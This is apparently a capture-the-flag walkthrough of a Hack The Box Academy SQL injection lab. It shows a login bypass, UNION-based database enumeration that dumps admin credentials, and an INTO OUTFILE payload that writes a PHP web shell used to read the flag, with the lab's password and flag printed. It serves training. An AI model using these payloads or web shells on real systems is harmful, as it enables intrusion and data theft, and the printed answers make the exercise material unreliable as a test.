The company`Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

![image](https://academy.hackthebox.com/storage/modules/33/sqli_skills.png)

Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!

![Pasted image 20250203155825.png](../../../IMAGES/Pasted%20image%2020250203155825.png)

# Bypassing the login page
---

First thing we face is the login page, we can begin this assessment by checking the source code: `CTRL+U`:

![Pasted image 20250203155958.png](../../../IMAGES/Pasted%20image%2020250203155958.png)

They haven't forgotten about any credentials or anything related, next thing in mind is trying the most simple SQLI payload:

```
' OR '1'='1'-- -
```

We can try this in the username section:

![Pasted image 20250203160114.png](../../../IMAGES/Pasted%20image%2020250203160114.png)

To our surprise, we were able to successfully log in:

![Pasted image 20250203160137.png](../../../IMAGES/Pasted%20image%2020250203160137.png)

# Database enumeration
---

We can go along with our roleplay, this part is not strictly related to the path intended to obtain the flag, but we can take advantage of the roleplay relating the company assessment and enumerate the database a little bit.

We are inside a dashboard panel, nothing seems off but the first thing we can notice is a search bar on the top right of the screen:

![Pasted image 20250203160237.png](../../../IMAGES/Pasted%20image%2020250203160237.png)

From previous modules, we found the way to enumerate the database, we can try the following:

## Columns number
---

We can enumerate the number of columns by using `ORDER BY`:

```
' order by 1-- -
```

We need to increase the number until we get an error specifying we're off the number of columns, let's automatize this by sending the request to burp's intruder and using it in the following way:

![Pasted image 20250203160644.png](../../../IMAGES/Pasted%20image%2020250203160644.png)



![Pasted image 20250203160804.png](../../../IMAGES/Pasted%20image%2020250203160804.png)

After checking the responses we can see the following:

![Pasted image 20250203161026.png](../../../IMAGES/Pasted%20image%2020250203161026.png)

Error message starts in `6`, so, the number of columns is `5`.

Knowing this, we can start next step.

## Union Injection
---

We can use the following to check if the Union Injection is working:

```sql
cn' UNION select 1,@@version,3,4,5-- -
```

We are using this since we know the number of columns, we'll get the following output:

![Pasted image 20250203161321.png](../../../IMAGES/Pasted%20image%2020250203161321.png)

So it indeed works, now we can begin to read the database:

```sql
cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
```

We get the following:

![Pasted image 20250203161420.png](../../../IMAGES/Pasted%20image%2020250203161420.png)

The `backup` table seems interesting, we can check it out:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -
```

![Pasted image 20250203161536.png](../../../IMAGES/Pasted%20image%2020250203161536.png)

We see the following, `admin_bk`, we can enumerate the columns in `admin_bk` using this:

```sql
cn' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='backup' AND TABLE_NAME='admin_bk'-- -
```

We will see the following:

![Pasted image 20250203162243.png](../../../IMAGES/Pasted%20image%2020250203162243.png)

Got `username` and `password`, let's read it:

```sql
cn' UNION SELECT 1,username,password,4,5 FROM backup.admin_bk-- -
```

![Pasted image 20250203162347.png](../../../IMAGES/Pasted%20image%2020250203162347.png)

Got credentials:

```ad-important
`admin`:`Inl@n3_fre1gh7_adm!n`
```

# Now, Let's go for our flag
---

Nice, this was just an scenario to enumerate the risks of this vulnerability on the system, since in the roleplay we are doing an assessment for a company, it was important to check the enumeration part.

For our flag, we can simply try to upload a webshell in the following way.

## Checking our write privileges
---

We can check if we have high privileges with this:

```sql
' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -
```

![Pasted image 20250203163116.png](../../../IMAGES/Pasted%20image%2020250203163116.png)

We can check we got `Y`, which stands for yes, meaning we have privileges, in order to write files, three conditions must be there:

```ad-important
1. User with`FILE` privilege enabled
2. MySQL global`secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
```

Let's check if `secure_file_priv` variable is not enabled:

```sql
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![Pasted image 20250203163254.png](../../../IMAGES/Pasted%20image%2020250203163254.png)

Value is empty, which means it is not enabled.

We can test writing with the following:

```sql
' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
```

If we visit `/proof.txt`, we can check the following:

![Pasted image 20250203163428.png](../../../IMAGES/Pasted%20image%2020250203163428.png)

We've written successfully, we can now write our webshell in the following way:

```
' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/webshell.php'-- -
```

We can confirm it worked by going to:

`http://IP:PORT/dashboard/webshell.php?0=id`

![Pasted image 20250203164153.png](../../../IMAGES/Pasted%20image%2020250203164153.png)

Let's list the `/` directory: `ls+/`

![Pasted image 20250203164320.png](../../../IMAGES/Pasted%20image%2020250203164320.png)


We can see the flag, we can simply read it by using `cat+/flag_cae1dadcd174.txt`

![Pasted image 20250203164435.png](../../../IMAGES/Pasted%20image%2020250203164435.png)

Got our flag: `528d6d9cedc2c7aab146ef226e918396`


![Pasted image 20250203164504.png](../../../IMAGES/Pasted%20image%2020250203164504.png)

